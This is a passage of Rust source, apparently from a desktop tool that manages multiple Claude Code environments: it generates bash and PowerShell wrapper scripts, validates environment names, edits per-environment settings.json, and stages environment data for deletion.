        // 关闭 Prompt 与退出码残留：默认按"未能启动"处理，成功启动后再取真实退出码
        o += "      $code = 1\n";
        o += "      try {\n";
        o += "        _ccmSync\n";
        // 封闭变量集：先清空全部受管变量，再只设置本环境配置了的那些
        o += "        foreach ($k in $managed) { Remove-Item -Path \"Env:\\$k\" -ErrorAction SilentlyContinue }\n";
        o += "        $env:CLAUDE_CONFIG_DIR=$h\n";
        if p.type_ == "router" {
            // 约束 1 + 偏差 4：CA 只注入给**网关环境**，且只在这条命令期间有效
            // （$bk 在 finally 里还原）。文件不存在时不设置，避免指向一个缺失的路径。
            // 同上：只注入这个网关自己的 bundle
            o += &format!(
                "        if (Test-Path \"$env:USERPROFILE\\.cc-manager\\ca\\{n}.pem\") {{ $env:NODE_EXTRA_CA_CERTS = \"$env:USERPROFILE\\.cc-manager\\ca\\{n}.pem\" }}\n"
            );
            o += &format!("        $env:ANTHROPIC_BASE_URL={}\n", ps_q(&p.base_url));
            o += "        $env:CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC='1'\n";
            if let Some(enc) = &p.token_enc {
                if !enc.is_empty() {
                    o += &format!(
                        "        $sec=ConvertTo-SecureString {} -ErrorAction Stop\n",
                        ps_q(enc)
                    );
                    o += "        $b=[Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec)\n";
                    o += "        $env:ANTHROPIC_AUTH_TOKEN=[Runtime.InteropServices.Marshal]::PtrToStringBSTR($b)\n";
                    o += "        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($b)\n";
                }
            }
            o += "        if ([string]::IsNullOrWhiteSpace($env:ANTHROPIC_AUTH_TOKEN)) { throw '网关 Key 缺失，未启动 Claude' }\n";
            if !p.opus_model.is_empty() {
                o += &format!(
                    "        $env:ANTHROPIC_DEFAULT_OPUS_MODEL={}\n",
                    ps_q(&p.opus_model)
                );
            }
            if !p.sonnet_model.is_empty() {
                o += &format!(
                    "        $env:ANTHROPIC_DEFAULT_SONNET_MODEL={}\n",
                    ps_q(&p.sonnet_model)
                );
            }
            if !p.haiku_model.is_empty() {
                o += &format!(
                    "        $env:ANTHROPIC_DEFAULT_HAIKU_MODEL={}\n",
                    ps_q(&p.haiku_model)
                );
            }
        }
        o += "        & $exe @rest\n";
        // **立即**取退出码：后面的清理与后置同步会执行别的命令，不能在那之后再读
        o += "        $code = $LASTEXITCODE\n";
        o += "      } catch {\n";
        // 凭据读取失败等"尚未启动 Claude"的错误：明确报错 + 非零退出码
        o += "        Write-Host \"环境启动失败：$($_.Exception.Message)\"\n";
        o += "        $code = 1\n";
        o += "      } finally {\n";
        // 按存在性还原：存在过就恢复原值，没存在过就删掉
        o += "        foreach ($k in $managed) { if ($bk.ContainsKey($k)) { Set-Item -Path \"Env:\\$k\" -Value $bk[$k] } else { Remove-Item -Path \"Env:\\$k\" -ErrorAction SilentlyContinue } }\n";
        o += "        _ccmSync -NoWait\n";
        o += "      }\n";
        // 调用方可见的退出码：成功 0、失败保留原始非零值、连续调用不残留上一次结果。
        // 「$?」在这里无法被包装函数修正（见 README 的说明与 scripts/probe-ps-exit-status.ps1）。
        o += "      $global:LASTEXITCODE = $code\n";
        o += "    }\n";
    }
    // 默认 `claude`：零写入、零同步、零环境变量污染，原样透传给官方 CLI。
    // 退出码同样显式回写一次（原生命中制，这里只是把"不残留"写成显式的）。
    o += "    default { & $exe @args; $global:LASTEXITCODE = $LASTEXITCODE }\n";
    o += "  }\n}\n";
    o
}

fn ensure_line(path: &PathBuf, line: &str) -> std::io::Result<()> {
    let existing = fs::read_to_string(path).unwrap_or_default();
    if existing.contains(MARK) {
        return Ok(());
    }
    if let Some(parent) = path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let sep = if existing.is_empty() || existing.ends_with('\n') {
        ""
    } else {
        "\n"
    };
    fs::write(path, format!("{existing}{sep}{line}\n"))
}

// 旧方案重定向 HOME/USERPROFILE，环境的 .claude.json 落在环境根目录；
// 新方案用 CLAUDE_CONFIG_DIR 指向 <环境>/.claude，CLI 会到该目录下找 .claude.json，
// 这里把旧文件搬进去，保留登录态、项目信任等状态。
fn migrate_instances(list: &[Profile]) {
    for p in list {
        if p.name.is_empty() {
            continue;
        }
        let inst = home().join(".claude-split").join(&p.name);
        let cfg = inst.join(".claude");
        for f in [".claude.json", ".claude.json.backup"] {
            let old = inst.join(f);
            let new = cfg.join(f);
            if old.is_file() && !new.exists() {
                let _ = fs::create_dir_all(&cfg);
                let _ = fs::rename(&old, &new);
            }
        }
    }
}

// 环境名会被直接拼进生成的 cc.sh(bash case 分支)/cc.ps1(PowerShell switch 分支)里，
// 必须限制为安全字符集，否则特殊字符(如 ) ; $ ` ' 空格)会破坏脚本语法，导致 claude 函数整体失效。
// 只约束【新建】环境；已存在于 config.json 的旧名字走 script_safe_name 的生成期兜底。
/// Claude Code 的官方子命令。环境名**必须避开**它们。
///
/// 生成的 shell 函数用 `case "$1"` 匹配环境名，所以环境一旦叫 `mcp`，
/// `claude mcp add ...` 会被当成"切到 mcp 环境"，**官方子命令被劫持**。
/// 名单取自 `claude --help` 的 Commands 段（2026-09-12 本机实测，非推测）。
const CLAUDE_SUBCOMMANDS: [&str; 21] = [
    "agents",
    "attach",
    "auth",
    "auto-mode",
    "doctor",
    "gateway",
    "import",
    "install",
    "kill",
    "logs",
    "mcp",
    "plugin",
    "plugins",
    "project",
    "respawn",
    "rm",
    "setup-token",
    "stop",
    "ultrareview",
    "update",
    "upgrade",
];

/// 名字是否与 Claude 官方子命令冲突。
/// 大小写不敏感地挡：bash 的 `case` 是大小写敏感的，所以 `MCP` 严格说不会劫持 `claude mcp`，
/// 但用户看到"我建了 MCP 环境，敲 `claude mcp` 却没进去"只会更困惑 —— 一律挡掉更清楚。
fn collides_with_claude_subcommand(n: &str) -> bool {
    CLAUDE_SUBCOMMANDS.contains(&n.trim().to_ascii_lowercase().as_str())
}

fn valid_name(n: &str) -> bool {
    if n.is_empty()
        || n.len() > 40
        || !n
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        return false;
    }
    // Claude 官方子命令不能被环境名占用（否则 `claude mcp ...` 会被劫持）
    if collides_with_claude_subcommand(n) {
        return false;
    }
    // __ 前缀保留给内部哨兵值(前端用 __all__ 作筛选哨兵、后端用 __main__ 标记默认 Claude)
    if n.starts_with("__") {
        return false;
    }
    // Windows 保留设备名无法作为目录名创建(.claude-split/<name> 会失败)
    !matches!(
        n.to_ascii_lowercase().as_str(),
        "con"
            | "prn"
            | "aux"
            | "nul"
            | "com1"
            | "com2"
            | "com3"
            | "com4"
            | "com5"
            | "com6"
            | "com7"
            | "com8"
            | "com9"
            | "lpt1"
            | "lpt2"
            | "lpt3"
            | "lpt4"
            | "lpt5"
            | "lpt6"
            | "lpt7"
            | "lpt8"
            | "lpt9"
    )
}

// 脚本生成期的最后防线：存量配置里可能有旧规则时代保存的名字(中文/点号等)，
// 它们本身无害、继续放行；只拦截会破坏 bash case 分支或引号/路径语法的字符。
// is_alphanumeric 按 Unicode 判定，中文字母数字均通过；空白、) ; $ ` ' " 等一律拦下。
fn script_safe_name(n: &str) -> bool {
    !n.is_empty()
        && n.chars()
            .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// 该环境能不能拿到**终端命令入口**（即 `claude <名字>` 这个命令词）。
///
/// 两个判据缺一不可：
/// 1. `script_safe_name` —— 名字不能破坏生成的脚本语法；
/// 2. `collides_with_claude_subcommand` —— 名字不能与 Claude 官方子命令同名，
///    否则 `claude mcp add ...` 会被 `case "$1"` / `switch ($sub)` 截走当成"切环境"，
///    `mcp` 被 `shift` 掉，**官方子命令根本没被调用**（实测复现：`claude mcp add x`
///    最终执行的是 `claude add x`）。
///    大小写不敏感是必须的：bash 的 `case` 敏感、**PowerShell 的 `switch` 默认不敏感**
///    （本机实测 `switch ('mcp') { 'MCP' {…} }` 命中），统一按不敏感处理才对两个平台都成立。
///
/// **不要把这个判据并进 `script_safe_name`。** 后者还被删除路径使用
/// （`stage_instance_data` / `delete_profile`），一收紧就会让冲突环境**删不掉**，
/// 把用户的配置、Key 与会话历史一起锁死 —— 那是比劫持更糟的缺陷。
/// "入口能不能用"与"数据能不能删"是两件事，必须分开。
fn can_have_terminal_entry(n: &str) -> bool {
    script_safe_name(n) && !collides_with_claude_subcommand(n)
}

fn profile_names(list: &[Profile]) -> Vec<String> {
    list.iter()
        .map(|p| p.name.clone())
        .filter(|n| script_safe_name(n) && n != "." && n != ".." && n != MAIN_PROFILE_KEY)
        .collect()
}

// mcp 模块只读环境名集合，不接触 token_enc；保持 load/profile_names/Profile 私有。
pub(crate) fn configured_profile_names() -> Vec<String> {
    profile_names(&load())
}

/// shell 配置写入结果的归并。抽成纯函数是为了能在任一平台同时覆盖两个分支——
/// macOS 分支在 Windows 上根本跑不到（CLAUDE.md 约束 1）。
#[derive(Debug, PartialEq, Eq)]
enum ShellConfigOutcome {
    /// 全部写入成功
    Ok,
    /// 部分失败：至少还有一个 shell 配置能生效
    Partial(String),
    /// 全部失败：终端不会加载集成脚本，必须报错而不是报成功
    Failed(String),
}

fn fold_shell_config_results(total: usize, failures: Vec<String>) -> ShellConfigOutcome {
    if failures.is_empty() {
        ShellConfigOutcome::Ok
    } else if failures.len() < total {
        // 至少有一个文件写进去了，这个 shell 仍能加载集成（如 bash 的 profile/rc）
        ShellConfigOutcome::Partial(failures.join("、"))
    } else {
        ShellConfigOutcome::Failed(failures.join("、"))
    }
}

// ---------------- Shell 支持矩阵（P0-B#7） ----------------
//
// 支持范围（界面必须与此一致，见 GuidePanel）：
//   macOS   : zsh（~/.zshrc）、bash（~/.bash_profile + ~/.bashrc）
//   Windows : Windows PowerShell 5.1、PowerShell 7+
//
// **不支持**：cmd.exe、fish、sh/dash、Git Bash、WSL。
//   它们无法靠 shell 函数拦截（语法不兼容，或不读 .ps1）。
//   **刻意不做 `claude.cmd` shim** —— 那会遮蔽 Claude Code 官方启动器，
//   升级/卸载时容易残留并劫持官方命令（用户 2026-09-12 裁定）。
//   对不支持的终端，界面必须明说"未支持"，不得让对方以为敲 `claude <环境名>` 会生效。

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ShellTarget {
    WindowsPowershell,
    Powershell7,
    Zsh,
    Bash,
}

impl ShellTarget {
    pub(crate) fn label(self) -> &'static str {
        match self {
            ShellTarget::WindowsPowershell => "Windows PowerShell 5.1",
            ShellTarget::Powershell7 => "PowerShell 7+",
            ShellTarget::Zsh => "zsh",
            ShellTarget::Bash => "bash",
        }
    }
}

/// 某个 PowerShell 宿主的 `$PROFILE`。命令起不来 = 该宿主未安装。
///
/// 5.1（`powershell.exe`）与 7+（`pwsh.exe`）的 `$PROFILE` 是**两个不同路径**，
/// 这正是 B#11 的根因：只查 5.1 会对着 pwsh 7 用户谎报"已接入"。
fn powershell_profile_path(host: &str) -> Result<PathBuf, String> {
    #[cfg(debug_assertions)]
    if std::env::var_os("CC_MANAGER_TEST_HOME").is_some() {
        return Ok(home().join("shell-profiles").join(host).join("profile.ps1"));
    }
    #[allow(unused_mut)]
    let mut command = std::process::Command::new(host);
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        command.creation_flags(0x08000000);
    }
    let out = command
        .args(["-NoProfile", "-Command", "$PROFILE"])
        .output()
        .map_err(|e| format!("未检测到 {host}（{e}）"))?;
    let path = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if path.is_empty() {
        return Err(format!("{host} 未返回 $PROFILE"));
    }
    Ok(PathBuf::from(path))
}

/// 该 shell 需要写入的配置文件。返回 Err = 该 shell 当前不可用（如未安装 pwsh）。
pub(crate) fn shell_config_paths(target: ShellTarget) -> Result<Vec<PathBuf>, String> {
    match target {
        ShellTarget::Zsh => Ok(vec![home().join(".zshrc")]),
        // 交互式**登录** bash 读 ~/.bash_profile，非登录读 ~/.bashrc —— 两个都要写。
        // 只写 .bashrc 会让 Terminal.app 里的登录 shell 加载不到集成。
        ShellTarget::Bash => Ok(vec![home().join(".bash_profile"), home().join(".bashrc")]),
        ShellTarget::WindowsPowershell => powershell_profile_path("powershell").map(|p| vec![p]),
        ShellTarget::Powershell7 => powershell_profile_path("pwsh").map(|p| vec![p]),
    }
}

/// 本机当前可用的受支持 shell 列表。
pub(crate) fn available_shell_targets() -> Vec<ShellTarget> {
    let candidates = if cfg!(target_os = "windows") {
        vec![ShellTarget::WindowsPowershell, ShellTarget::Powershell7]
    } else {
        vec![ShellTarget::Zsh, ShellTarget::Bash]
    };
    candidates
        .into_iter()
        .filter(|target| {
            shell_config_paths(*target)
                .map(|p| !p.is_empty())
                .unwrap_or(false)
        })
        .collect()
}

/// 改集成脚本**不会**替换已经打开的终端里那个 `claude` 函数（它是启动时 source 进去的）。
/// 凡是"脚本变了、行为才会变"的提示都必须带上这句，否则用户会以为改完立刻就生效。
const RELOAD_HINT: &str =
    "注意：已经打开的终端里还是旧的包装函数，需重开终端（或重新加载集成脚本）后才生效。";

fn install_integration(list: &[Profile]) -> Result<String, String> {
    fs::create_dir_all(cfg_dir()).map_err(|e| e.to_string())?;
    migrate_instances(list);
    // Skills / Agents 逐项分发；不再把整个目录连到一起。
    let mut link_warns = extensions::sync_all_locked(&profile_names(list));
    // 名字含不安全字符的环境不会被写进终端脚本(generate_sh/ps1 里跳过)，明确告知而不是静默失效
    let unsafe_names: Vec<&str> = list
        .iter()
        .map(|p| p.name.as_str())
        .filter(|n| !n.is_empty() && !script_safe_name(n))
        .collect();
    if !unsafe_names.is_empty() {
        // 不再写"请删除后用合规名称重建"：删除会连 `.claude/projects`（会话历史）一起清掉，
        // 而改名迁移尚未提供。只如实说明现状 + 留存指引。
        link_warns.push(format!(
            "环境 {} 的名称含不安全字符，无法生成终端入口（`claude <名字>` 用不了）；\
             配置、Key 与历史数据均已保留，仍可查看、编辑和删除。改名迁移功能待提供。{}",
            unsafe_names.join("、"),
            RELOAD_HINT
        ));
    }
    // 与 Claude 官方子命令同名的环境（旧规则时代建的）：
    // `claude mcp add ...` 会被生成的 `case "$1"` / `switch ($sub)` 截走当成"切环境"，
    // `mcp` 被 shift 掉，**官方子命令根本不会被调用**（实测：最终执行 `claude add x`）。
    // 现在不再为它们生成终端入口（见 can_have_terminal_entry），官方子命令恢复优先。
    // 数据一律保留，只告警、不阻断、也不引导删除。
    let shadowing: Vec<&str> = list
        .iter()
        .map(|p| p.name.as_str())
        .filter(|n| !n.is_empty() && collides_with_claude_subcommand(n))
        .collect();
    if !shadowing.is_empty() {
        link_warns.push(format!(
            "环境 {} 与 Claude 官方子命令同名，已为它停用终端入口：`claude {}` 现在交还给 Claude 官方子命令。\
             该环境的配置、Key 与历史数据均已保留，仍可查看、编辑和删除；改名迁移功能待提供。{}",
            shadowing.join("、"),
            shadowing.first().unwrap_or(&""),
            RELOAD_HINT
        ));
    }
    let warn_suffix = if link_warns.is_empty() {
        String::new()
    } else {
        format!("（注意：{}）", link_warns.join("；"))
    };
    let (script_path, script_body) = if cfg!(target_os = "windows") {
        (ps_path(), generate_ps1(list))
    } else {
        (sh_path(), generate_sh(list))
    };
    fs::write(&script_path, script_body).map_err(|e| e.to_string())?;

    // 逐个受支持 shell 接入。Windows 上 5.1 与 PowerShell 7 的 $PROFILE 是**不同文件**，
    // 只写其中一个就会造成 B#11：用 pwsh 7 的人集成其实没生效，界面却说"已接入"。
    let targets = available_shell_targets();
    if targets.is_empty() {
        return Ok(format!(
            "已生成集成脚本（{}），但没有检测到受支持的终端。当前支持 macOS 的 zsh / bash，以及 Windows 的 PowerShell 5.1 / 7。",
            script_path.display()
        ));
    }

    let line = if cfg!(target_os = "windows") {
        format!(". \"{}\"  {}", script_path.display(), MARK)
    } else {
        format!(
            "[ -f \"{p}\" ] && source \"{p}\"  {m}",
            p = script_path.display(),
            m = MARK
        )
    };

    let mut installed: Vec<String> = vec![];
    let mut failed: Vec<String> = vec![];
    for target in &targets {
        let paths = shell_config_paths(*target)?;
        let mut failures = vec![];
        for path in &paths {
            if let Err(e) = ensure_line(path, &line) {
                failures.push(format!("{}（{e}）", path.display()));
            }
        }
        match fold_shell_config_results(paths.len(), failures) {
            ShellConfigOutcome::Ok => installed.push(target.label().to_string()),
            ShellConfigOutcome::Partial(joined) => {
                installed.push(format!("{}（部分未能写入：{joined}）", target.label()))
            }
            ShellConfigOutcome::Failed(joined) => {
                failed.push(format!("{}：{joined}", target.label()))
            }
        }
    }

    // 一个都没写进去 —— 终端不会加载集成脚本，绝不能报成功
    if installed.is_empty() {
        return Err(format!(
            "集成脚本已生成（{}），但写入终端配置失败：{}。终端不会加载它，请在「环境配置」里点一次「保存并接入终端」重试。",
            script_path.display(),
            failed.join("；")
        ));
    }

    let mut msg = format!("已接入：{}。请新开一个终端窗口生效。", installed.join("、"));
    if !failed.is_empty() {
        msg += &format!("未能接入：{}。", failed.join("；"));
    }
    msg += &warn_suffix;
    Ok(msg)
}

// 生成的脚本是 generate_sh/generate_ps1 的纯函数结果，但磁盘上的旧脚本不会自己更新：
// install_integration 只在增删环境、导入证书或手动同步时调用。升级软件后生成器改了、
// 脚本却还是旧的，用户就会一直踩已修复的 bug。故在 GUI 启动与 --sync 两条路径上比对自愈。
// 只在脚本已存在时刷新——从未接入过终端的用户不该被凭空写文件。
fn refresh_scripts_if_stale(list: &[Profile]) -> Option<String> {
    let (path, expected) = if cfg!(target_os = "windows") {
        (ps_path(), generate_ps1(list))
    } else {
        (sh_path(), generate_sh(list))
    };
    if !path.exists() {
        return None;
    }
    if fs::read_to_string(&path).ok().as_deref() == Some(expected.as_str()) {
        return None;
    }
    match fs::write(&path, &expected) {
        Ok(_) => Some(format!("集成脚本已随版本更新：{}", path.display())),
        Err(e) => Some(format!("集成脚本更新失败：{e}")),
    }
}

// ---------------- 环境 settings.json ----------------
const BYPASS_MODE: &str = "bypassPermissions";

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct InstanceSettings {
    path: String,
    exists: bool,
    content: String,
    // 保存时回传做冲突检测：Claude Code 或其他工具可能同时修改这个文件。
    revision: String,
    bypass_enabled: bool,
    // 更高优先级的配置也设了 defaultMode 时，本开关不生效
    overridden_by: Option<String>,
}

// 只认 config.json 里已存在的环境名，顺带挡掉 ".." 这类越界输入
fn instance_settings_path(name: &str) -> Result<PathBuf, String> {
    if !profile_names(&load()).iter().any(|n| n == name) {
        return Err(format!("未找到环境「{name}」"));
    }
    Ok(sync::instance_dir(name).join("settings.json"))
}

fn settings_revision(content: Option<&str>) -> String {
    use sha2::{Digest, Sha256};
    match content {
        None => "missing".into(),
        Some(text) => hex::encode(Sha256::digest(text.as_bytes())),
    }
}

fn settings_content(path: &Path) -> Result<Option<String>, String> {
    match fs::read_to_string(path) {
        Ok(text) => Ok(Some(text)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(format!("读取设置失败：{e}")),
    }
}

fn save_settings_checked(
    path: &Path,
    value: &serde_json::Value,
    revision: &str,
) -> Result<(), String> {
    let current = settings_content(path)?;
    if settings_revision(current.as_deref()) != revision {
        return Err("该文件已被后台同步修改，请重新加载后再保存".into());
    }
    save_settings_value(path, value)
}

fn bypass_mode_of(value: &serde_json::Value) -> Option<&str> {
    value.get("permissions")?.get("defaultMode")?.as_str()
}

// 默认 Claude ~/.claude/settings.json 在 home 目录下启动环境时会以“项目级配置”身份
// 覆盖环境的用户级配置（与 health.rs 对 model 字段的判定同源）。
fn bypass_override_source() -> Option<String> {
    let path = home().join(".claude").join("settings.json");
    let value: serde_json::Value = serde_json::from_str(&fs::read_to_string(&path).ok()?).ok()?;
    bypass_mode_of(&value)?;
    Some(path.display().to_string())
}

// 只动 permissions.defaultMode 一个键；permissions 因此变空则一并删除，
// 用户自己配的 allow/deny/ask 规则完整保留。
fn apply_bypass(value: &mut serde_json::Value, enabled: bool) -> Result<(), String> {
    let obj = value.as_object_mut().ok_or("settings.json 顶层不是对象")?;
    if enabled {
        obj.entry("permissions")
            .or_insert_with(|| serde_json::json!({}))
            .as_object_mut()
            .ok_or("permissions 字段不是对象")?
            .insert("defaultMode".into(), serde_json::json!(BYPASS_MODE));
    } else if let Some(perms) = obj.get_mut("permissions").and_then(|v| v.as_object_mut()) {
        perms.remove("defaultMode");
        if perms.is_empty() {
            obj.remove("permissions");
        }
    }
    Ok(())
}

fn save_settings_value(path: &Path, value: &serde_json::Value) -> Result<(), String> {
    if let Some(dir) = path.parent() {
        fs::create_dir_all(dir).map_err(|e| format!("创建目录失败：{e}"))?;
    }
    // 手工编辑随时可能写坏，落盘前留一份上一版
    if path.exists() {
        fs::copy(path, path.with_extension("json.bak")).map_err(|e| format!("备份失败：{e}"))?;
    }
    sync::write_json_atomic(path, value).map_err(|e| format!("写入失败：{e}"))
}

fn load_settings_value(path: &Path) -> Result<serde_json::Value, String> {
    if !path.exists() {
        return Ok(serde_json::json!({}));
    }
    let text = fs::read_to_string(path).map_err(|e| format!("读取失败：{e}"))?;
    if text.trim().is_empty() {
        return Ok(serde_json::json!({}));
    }
    serde_json::from_str(&text)
        .map_err(|e| format!("settings.json 不是有效 JSON，请先在编辑器里修好：{e}"))
}

#[tauri::command]
fn read_instance_settings(name: String) -> Result<InstanceSettings, String> {
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
    read_instance_settings_locked(name)
}

fn read_instance_settings_locked(name: String) -> Result<InstanceSettings, String> {
    let path = instance_settings_path(&name)?;
    let snapshot = settings_content(&path)?;
    let revision = settings_revision(snapshot.as_deref());
    let exists = snapshot.is_some();
    let content = snapshot.unwrap_or_default();
    // 开关状态以文件为唯一真相：内容解析不了就按未开启显示，交给编辑器修
    let bypass_enabled = serde_json::from_str::<serde_json::Value>(&content)
        .ok()
        .and_then(|v| bypass_mode_of(&v).map(|m| m == BYPASS_MODE))
        .unwrap_or(false);
    Ok(InstanceSettings {
        path: path.display().to_string(),
        exists,
        content,
        revision,
        bypass_enabled,
        overridden_by: bypass_override_source(),
    })
}

#[tauri::command]
fn write_instance_settings(
    name: String,
    content: String,
    revision: String,
) -> Result<InstanceSettings, String> {
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
    let path = instance_settings_path(&name)?;
    let value: serde_json::Value =
        serde_json::from_str(&content).map_err(|e| format!("不是有效 JSON：{e}"))?;
    if !value.is_object() {
        return Err("settings.json 顶层必须是对象".into());
    }
    save_settings_checked(&path, &value, &revision)?;
    read_instance_settings_locked(name)
}

#[tauri::command]
fn set_bypass_permissions(name: String, enabled: bool) -> Result<InstanceSettings, String> {
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
    let path = instance_settings_path(&name)?;
    let mut value = load_settings_value(&path)?;
    apply_bypass(&mut value, enabled)?;
    save_settings_value(&path, &value)?;
    read_instance_settings_locked(name)
}

// ---------------- token（平台原生） ----------------
// 在 Windows 上创建 PowerShell 命令时隐藏控制台窗口（CREATE_NO_WINDOW）
fn ps_command() -> std::process::Command {
    #[allow(unused_mut)]
    let mut c = std::process::Command::new("powershell");
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        c.creation_flags(0x08000000);
        // Windows PowerShell 5 不能加载调用方 PowerShell 7 的系统模块。
        c.env_remove("PSModulePath");
    }
    c
}

fn store_token(name: &str, token: &str) -> Result<Option<String>, String> {
    credentials::store(name, token)
}

fn clear_token(name: &str) -> Result<(), String> {
    credentials::clear(name)
}

// ---------------- 命令 ----------------
#[tauri::command]
fn list_profiles() -> Vec<Profile> {
    load()
        .into_iter()
        .map(|mut profile| {
            profile.token_enc = None;
            profile
        })
        .collect()
}

#[tauri::command]
fn save_profile(profile: Profile, token: Option<String>) -> Result<String, String> {
    // 全程持配置锁：这是"读 → 改 → 写"的复合操作，中途若被 `claude --sync` 插入，
    // 我们的 save(&list) 会用**加载时的陈旧 list** 覆盖对方的改动（丢更新）。
    let _guard = sync::acquire_config_lock().ok_or("配置正在同步，请稍后重试")?;
    let list = load();
    let mut p = profile;
    // 先归一化再校验：校验和存储必须是同一个字符串
    p.name = p.name.trim().to_string();
    p.base_url = normalize_base_url(&p.base_url);
    // 只校验新建；已存在的名字（旧规则时代创建）放行，否则老用户连换 key 都保存不了
    let is_update = list.iter().any(|x| x.name == p.name);
    if !is_update && !valid_name(&p.name) {
        return Err(
            "环境名称只能包含英文字母、数字、下划线、短横线（1~40 个字符），且不能以 __ 开头、不能使用 Windows 保留名，也不能与 Claude 的官方子命令同名（如 mcp、doctor、update —— 否则 claude mcp ... 会被当成使用该环境启动）。".into(),
        );
    }
    if p.type_ == "router" {
        if let Some(reason) = base_url_rejection(&p.base_url) {
            return Err(reason.message().into());
        }
        match token.as_ref().filter(|s| !s.is_empty()) {
            Some(t) => match store_token(&p.name, t) {
                Ok(enc) => {
                    p.token_enc = enc;
                    p.has_token = true;
                }
                Err(e) => return Err(format!("保存 token 失败：{e}")),
            },
            None => {
                if let Some(old) = list.iter().find(|x| x.name == p.name) {
                    p.token_enc = old.token_enc.clone();
                    p.has_token = old.has_token;
                }
            }
        }
    } else {
        p.base_url = String::new();
        p.token_enc = None;
        p.opus_model = String::new();
        p.sonnet_model = String::new();
        p.haiku_model = String::new();
    }

    let mut list = list;
    if let Some(idx) = list.iter().position(|x| x.name == p.name) {
        list[idx] = p;
    } else {
        list.push(p);
    }
    save(&list).map_err(|e| e.to_string())?;
    let integration = install_integration(&list)?;
    // 新环境保存成功后就应当拥有共享 MCP，不能等用户再点一次“同步并修复”
    // 或重启应用。这里已经持有配置锁，因此调用非重入的内部入口。
    let names = profile_names(&list);
    let outcome = sync::sync_configs_locked(&names)?;
    Ok(compose_sync_report(&integration, &outcome, &names))
}

#[derive(Clone)]
struct DeletionFileSnapshot {
    path: PathBuf,
    bytes: Option<Vec<u8>>,
}

fn config_artifact_paths_in(dir: &Path) -> Result<Vec<PathBuf>, String> {
    let mut paths = vec![];
    if dir.is_dir() {
        for entry in fs::read_dir(dir).map_err(|e| e.to_string())? {
            let path = entry.map_err(|e| e.to_string())?.path();
            let Some(file_name) = path.file_name().and_then(|name| name.to_str()) else {
                continue;
            };
            if file_name.starts_with("config") && file_name.ends_with(".json") {
                paths.push(path);
            }
        }
    }
    Ok(paths)
}

fn deletion_artifact_paths() -> Result<Vec<PathBuf>, String> {
    let mut paths = vec![
        cfg_path(),
        cfg_backup_path(),
        cfg_path().with_extension("json.tmp"),
        cfg_path().with_extension("previous.json"),
        cfg_backup_path().with_extension("next.json"),
        cfg_backup_path().with_extension("previous.json"),
        ps_path(),
        sh_path(),
        cfg_dir().join("sync-snapshot.json"),
        shared_config::ledger_path(),
        cfg_dir().join("shared").join("resources.json"),
    ];
    for profile in load() {
        if let Some(path) = ca_bundle_path(&profile.name) {
            paths.push(path);
        }
        paths.extend(
            mcp::environment_cleanup_files(&mcp::McpPaths::system(), &profile.name)?
                .into_iter()
                .map(|(p, _)| p),
        );
    }
    paths.extend(config_artifact_paths_in(&cfg_dir())?);
    paths.sort();
    paths.dedup();
    Ok(paths)
}

fn capture_deletion_files() -> Result<Vec<DeletionFileSnapshot>, String> {
    deletion_artifact_paths()?
        .into_iter()
        .map(|path| {
            let bytes = match fs::read(&path) {
                Ok(bytes) => Some(bytes),
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
                Err(error) => return Err(format!("读取 {} 失败：{error}", path.display())),
            };
            Ok(DeletionFileSnapshot { path, bytes })
        })
        .collect()
}

fn restore_deletion_files(snapshots: &[DeletionFileSnapshot]) -> Result<(), String> {
    let mut errors = vec![];
    for snapshot in snapshots {
        let result = match &snapshot.bytes {
            Some(bytes) => fs::write(&snapshot.path, bytes),
            None => match fs::remove_file(&snapshot.path) {
                Ok(()) => Ok(()),
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
                Err(error) => Err(error),
            },
        };
        if let Err(error) = result {
            errors.push(format!("恢复 {} 失败：{error}", snapshot.path.display()));
        }
    }
    if errors.is_empty() {
        Ok(())
    } else {
        Err(errors.join("；"))
    }
}

fn stage_instance_data(name: &str) -> Result<Option<(PathBuf, PathBuf)>, String> {
    // 名称来自配置文件，仍要防御被手工篡改后的路径穿越。
    if name == "." || name == ".." || !script_safe_name(name) {
        return Err("环境名称不安全，拒绝删除数据目录。请手动检查配置。".into());
    }
    let root = home().join(".claude-split").join(name);
    match fs::symlink_metadata(&root) {
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(format!("检查环境数据 {} 失败：{error}", root.display())),
        Ok(_) => {}
    }
    let staging_dir = cfg_dir().join("delete-staging");
    fs::create_dir_all(&staging_dir).map_err(|e| format!("创建删除暂存目录失败：{e}"))?;
    let staged = staging_dir.join(format!(
        "{name}-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos()
    ));
    fs::rename(&root, &staged).map_err(|e| format!("暂存环境数据 {} 失败：{e}", root.display()))?;
    Ok(Some((root, staged)))
}

fn purge_instance_root(root: &Path) -> Result<(), String> {
    // 先显式解除共享目录链接/Junction，确保递归删除永远不会触及默认 Claude目录。
    let claude = root.join(".claude");
    for sub in sync::SHARED_SUBDIRS {
        let link = claude.join(sub);
        // read_link 同时识别 Unix symlink 与 Windows Junction；真实目录留给
        // remove_dir_all 处理，不能误当链接调用平台相关的解除逻辑。
        if fs::read_link(&link).is_ok() {
            sync::remove_link(&link)
                .map_err(|e| format!("解除共享链接 {} 失败：{e}", link.display()))?;
        }
    }
    fs::remove_dir_all(root).map_err(|e| format!("删除环境数据 {} 失败：{e}", root.display()))
}

